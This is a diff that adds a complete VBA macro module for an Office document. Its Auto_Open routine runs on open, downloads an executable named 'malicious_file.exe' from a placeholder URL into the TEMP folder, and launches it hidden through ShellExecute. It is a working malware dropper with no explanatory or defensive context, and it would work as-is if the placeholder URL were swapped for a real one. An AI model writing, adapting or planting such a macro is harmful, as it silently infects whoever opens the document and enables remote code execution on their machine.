@@ -1,0 +1,27 @@
+Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
+(ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, _
+ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
+
+Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" _
+(ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, _
+ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
+
+Sub Auto_Open()
+    Dim myURL As String
+    Dim destinationPath As String
+    Dim filePath As String
+    Dim result As Long
+
+    myURL = "https://example.com/malicious_file.exe" ' URL of the file to download
+    destinationPath = Environ("TEMP") & "\malicious_file.exe" ' Destination path to save the downloaded file
+    filePath = Environ("TEMP") & "\malicious_file.exe" ' File path to execute after download
+
+    ' Download the file
+    result = URLDownloadToFile(0, myURL, destinationPath, 0, 0)
+
+    ' Check if download was successful
+    If result = 0 Then
+        ' Execute the downloaded file
+        ShellExecute 0, "open", filePath, vbNullString, vbNullString, vbHide
+    End If
+End Sub
